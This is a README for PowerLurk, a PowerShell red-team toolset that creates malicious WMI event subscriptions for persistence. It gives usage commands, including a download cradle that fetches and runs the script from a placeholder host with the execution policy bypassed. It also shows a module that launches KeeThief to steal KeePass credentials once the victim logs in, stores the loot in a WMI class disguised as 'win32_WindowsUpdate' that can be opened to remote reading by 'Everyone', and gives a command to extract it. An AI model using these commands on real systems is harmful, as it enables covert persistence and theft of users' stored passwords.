# PowerLurk

PowerLurk is a PowerShell toolset for building malicious WMI Event Subsriptions. The goal is to make WMI events easier to fire off during a penetration test or red team engagement. Please see my post **Creeping on Users with WMI Events: Introducing PowerLurk** for more detailed information: https://pentestarmoury.com/2016/07/13/151/

To use PowerLurk, you must import the PowerLurk.ps1 module into your instance of PowerShell. This can be done a couple of ways:

Import locally

```PS> powershell.exe -NoP -Exec ByPass -C Import-Module c:\\temp\\PowerLurk.ps1```

Download Cradle

```PS> powershell.exe -NoP -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerLurk.ps1'); Get-WmiEvent"```

## Get-WmiEvent

By default, Get-WmiEvent queries WMI for all __FilterToConsumerBinding instances and associated __EventFilter, and __EventConsumer instances. 
Objects returned can be deleted by piping to Remove-WmiObject.

Return all active WMI event objects with the name 'RedTeamEvent'

```Get-WmiEvent -Name RedTeamEvent```

Twitter - @sw4mp_fox
Delete 'RedTeamEvent' WMI event objects

```Get-WmiEvent -Name RedTeamEvent | Remove-WmiObject```

## Register-MaliciousWmiEvent

This cmdlet is the core of PowerLurk. It takes a command, script, or scriptblock as the action and a precanned trigger then creates the WMI Filter, Consumer, and FilterToConsumerBinding required for a fully functional Permanent WMI Event Subscription. A number of WMI event triggers, or filters, are preconfigured. The trigger must be specified with the -Trigger parameter. There are three consumers to choose from, PermanentCommand, PermanentScript, and LocalScriptBLock. Example usage:

Write the notepad.exe process ID to C:\temp\log.txt whenever notepad.exe starts

```Register-MaliciousWmiEvent -EventName LogNotepad -PermanentCommand “cmd.exe /c echo %ProcessId% >> c:\\temp\\log.txt” -Trigger ProcessStart -ProcessName notepad.exe```

Cleanup Malicious WMI Event

```Get-WmiEvent -Name LogNotepad | Remove-WmiObject```

## Add-KeeThiefLurker

creates a permanent WMI event that will execute KeeThief (See @Harmj0y's KeeThief at https://github.com/adaptivethreat/KeeThief) 4 minutes after the 'keepass' process starts. This gives the target time to log into their KeePass database. 

The KeeThief logic and its output are either stored in a custom WMI namespace and class or regsitry values. If a custom 
WMI namespace and class are selected, you have the option to expose that namespace so that it can be read remotely 
by 'Everyone'. Registry path and value names are customizable using the associated switches; however, this is optional as
defaults are set. Example usage:

Add KeeThiefLurker event using WMI class storage 

```Add-KeeThiefLurker -EventName KeeThief -WMI```

Query custom WMI class

```Get-WmiObject -Namespace root\software win32_WindowsUpdate -List```

Extract KeeThief output from WMI class

```[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($(Get-WmiObject -Namespace root\software win32_WindowsUpdate -List).Properties['Output'].value))```

Cleanup KeeThiefLurker

```Remove-KeeThiefLurker -EventName KeeThief -WMI```

Twitter - @sw4mp_f0x
